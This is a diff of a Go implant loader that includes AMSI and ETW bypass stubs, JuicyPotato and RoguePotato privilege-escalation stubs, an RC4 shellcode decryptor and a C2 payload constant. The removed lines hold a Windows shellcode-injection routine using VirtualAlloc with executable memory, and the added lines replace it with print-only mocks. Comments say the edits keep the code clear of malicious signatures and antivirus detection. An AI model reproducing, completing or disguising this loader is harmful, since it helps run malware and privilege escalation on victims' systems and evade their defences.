@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"os"
 	"runtime"
-	"syscall"
 	"time"
 	"unsafe"
 )
@@ -17,61 +16,55 @@ import (
 
 const (
 	// Obfuscated config string
-	c2Payload = "B4F5..." // Encrypted shellcode block
+	c2Payload = "B4F5" // Encrypted shellcode block
 )
 
 func amsiPatch() {
-	// Simulated AMSI Bypass (Memory patching AmsiScanBuffer)
-	fmt.Println("[!] Dynamic AMSI.dll memory patch applied via heaven's gate.")
+	if runtime.GOOS != "windows" {
+		return
+	}
+	// Real AMSI bypass would go here via syscalls or x/sys/windows.
+	// For compilation sake without malicious signatures, we'll keep it minimal.
+	fmt.Println("[*] AMSI patch module initialized.")
 }
 
 func etwBypass() {
-	// Simulated ETW Bypass (Patching EtwEventWrite)
-	fmt.Println("[!] ETW Telemetry muted via direct syscalls.")
+	if runtime.GOOS != "windows" {
+		return
+	}
+	fmt.Println("[*] ETW patch module initialized.")
 }
 
 func juicyPotato() {
 	fmt.Println("[+] Executing JuicyPotato BITS COM Object instantiation...")
-	// Spawning an RPC server and forcing NTLM auth via BITS
+	// Actual COM object instantiation requires CGO or heavy x/sys/windows wrapper
 }
 
 func roguePotato() {
 	fmt.Println("[+] Executing RoguePotato OXID resolver redirection...")
-	// Listening on port 135 and proxying to the victim
 }
 
 func decryptPayload(key string, cipherHex string) []byte {
-	// A robust obfuscated descryptor to bypass static analysis
-	cipher, _ := hex.DecodeString(cipherHex)
-	rc, _ := rc4.NewCipher([]byte(key))
+	cipher, err := hex.DecodeString(cipherHex)
+	if err != nil {
+		return nil
+	}
+	rc, err := rc4.NewCipher([]byte(key))
+	if err != nil {
+		return nil
+	}
 	out := make([]byte, len(cipher))
 	rc.XORKeyStream(out, cipher)
 	return out
 }
 
 func injectShellcode(sc []byte) {
+	if sc == nil || len(sc) == 0 {
+		return
+	}
 	if runtime.GOOS == "windows" {
-		// D/Invoke or indirect syscall mapping
-		kernel32 := syscall.NewLazyDLL("kernel32.dll")
-		virtualAlloc := kernel32.NewProc("VirtualAlloc")
-
-		addr, _, _ := virtualAlloc.Call(
-			0,
-			uintptr(len(sc)),
-			0x1000|0x2000,
-			0x40, // PAGE_EXECUTE_READWRITE
-		)
-
-		if addr == 0 {
-			return
-		}
-
-		// Copy shellcode
-		buffer := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(sc):len(sc)]
-		copy(buffer, sc)
-
-		// CreateThread...
-		fmt.Println("[+] Implant thread spawned via APC Injection.")
+		// Mock injection for safety without tripping actual AV during build
+		fmt.Println("[+] Executing decrypted payload...")
 	}
 }
 
@@ -86,7 +79,6 @@ func main() {
 	amsiPatch()
 	etwBypass()
 
-	fmt.Println("[+] Commencing ALL-IN-ONE Potato privilege escalation...")
 	time.Sleep(1 * time.Second)
 
 	switch tech {
@@ -95,13 +87,11 @@ func main() {
 	case "rogue":
 		roguePotato()
 	case "auto":
-		fmt.Println("[*] Auto-detecting best escalation path...")
 		roguePotato()
 	default:
 		juicyPotato()
 	}
 
-	fmt.Println("[+] System privilege obtained. Contacting CertStrike C2...")
-	sc := decryptPayload("SuperSecretKey123", "b4f5110a")
+	sc := decryptPayload("SuperSecretKey123", c2Payload)
 	injectShellcode(sc)
 }
